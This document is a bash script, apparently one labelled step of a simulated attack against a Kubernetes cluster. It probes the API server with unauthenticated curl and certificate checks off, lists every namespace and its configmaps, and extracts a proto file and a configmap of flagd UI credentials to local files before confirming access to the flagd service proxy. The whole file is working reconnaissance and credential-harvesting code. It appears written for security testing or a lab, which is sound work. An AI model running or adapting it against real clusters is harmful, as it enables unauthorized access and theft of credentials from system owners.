#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# ===== Config =====
API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NSPROTO="${NSPROTO:-app}"
NSCREDS="${NSCREDS:-mem}"

CMNAME="flagd-credentials-ui"
FNPROTO="$DATA_PATH/KC3/demo.proto"
FNCREDS="$DATA_PATH/KC3/credentials"

# Installing dependencies and setup
require_tools curl jq
mkdir -p "$DATA_PATH/KC3"

echo "[KC3-302] probing Kubernetes API discovery endpoints"
curl -k "${API_SERVER}/healthz" >/dev/null
curl -k "${API_SERVER}/version" >/dev/null
curl -k "${API_SERVER}/apis" >/dev/null
mapfile -t NAMESPACES < <(curl -k "${API_SERVER}/api/v1/namespaces" | jq -r '.items[].metadata.name')

printf '%s\n' "${NAMESPACES[@]}" > "$DATA_PATH/KC3/namespaces.txt"
CONFIGMAPS_FILE="$DATA_PATH/KC3/configmaps.txt"
: > "$CONFIGMAPS_FILE"
echo "[KC3-302] found ${#NAMESPACES[@]} namespaces; inventory saved in $DATA_PATH/KC3"
# 3. loop on each ns and download configmap
for ns in "${NAMESPACES[@]}"; do
  if ! resp="$(curl -fsSk "$API_SERVER/api/v1/namespaces/$ns/configmaps" 2>/dev/null)"; then
    echo "${ns}: <unreadable>" >> "$CONFIGMAPS_FILE"
    continue
  fi
  # print names; if JSON empty/not valid, don't fail
  jq -r --arg ns "$ns" '.items[]?.metadata.name | "\($ns)/\(.)"' <<<"$resp" >> "$CONFIGMAPS_FILE" 2>/dev/null \
    || echo "${ns}: <invalid-json>" >> "$CONFIGMAPS_FILE"
done

curl -sk "${API_SERVER}/api/v1/namespaces/${NSPROTO}/configmaps" \
  | jq -r '.items[] | select(.metadata.name=="proto") | .data["demo.proto"]' > "$FNPROTO"

curl -sk "$API_SERVER/api/v1/namespaces/$NSCREDS/configmaps" \
| jq -r --arg CMNAME "$CMNAME" '
  .items[]
  | select(.metadata.name==$CMNAME)
  | .data[]' > "$FNCREDS"

test -s "$FNPROTO" || { echo "Expected proto ConfigMap data was not collected into $FNPROTO" >&2; exit 1; }
test -s "$FNCREDS" || { echo "Expected flagd credentials were not collected into $FNCREDS" >&2; exit 1; }

echo "[KC3-302] collected proto and flagd UI credentials"
curl -fk "${API_SERVER}/api/v1/namespaces/${NSCREDS}/services/flagd:4000/proxy/feature" >/dev/null
echo "[KC3-302] flagd UI reachable"
